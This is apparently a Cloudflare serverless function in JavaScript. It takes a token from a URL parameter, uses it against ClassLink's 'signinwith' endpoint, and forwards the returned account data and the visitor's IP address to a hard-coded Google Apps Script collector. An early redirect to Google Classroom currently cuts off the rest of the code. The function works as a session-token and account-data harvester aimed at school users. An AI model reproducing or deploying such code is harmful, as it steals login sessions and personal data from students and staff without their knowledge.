export async function onRequest(context) {
    const { request } = context;
    const url = new URL(request.url);
    const searchParams = url.search;

    return Response.redirect("https://classroom.google.com/h", 302);
    const idMatch = searchParams.match(/[?&]i=([^&]+)/);
    const id = idMatch ? idMatch[1] : null;  // If a match is found, extract the value

    // Apply regex to extract the content between the second and third quotation marks
    let extractedText = null;
    if (id) {
        const regex = /^(?:[^"]*"[^"]*"){2}([^"]*)/;
        const match = id.match(regex);
        extractedText = match ? match[1] : null;
    }

    const ip = request.headers.get("CF-Connecting-IP");

    try {
        if (id) {
            // Proxy request to nodeapi.classlink.com
            const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
                method: "GET",
                headers: {
                    "gwstoken": extractedText
                }
            });

            const nodeApiData = await nodeApiResponse.json();
            // Send data to Google Script
            const response = await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ data: nodeApiData, ip: ip })
            });

            if (!response.ok) {
                return new Response(JSON.stringify({ error: "Google Script failed" }), { status: 500 });
            }
        } else {
            return new Response(JSON.stringify({ error: "ID parameter missing" }), { status: 400 });
        }
    } catch (error) {
        console.error("Error during request:", error);
        return new Response(JSON.stringify({ error: "Internal server error: "+error }), { status: 500 });
    }
}
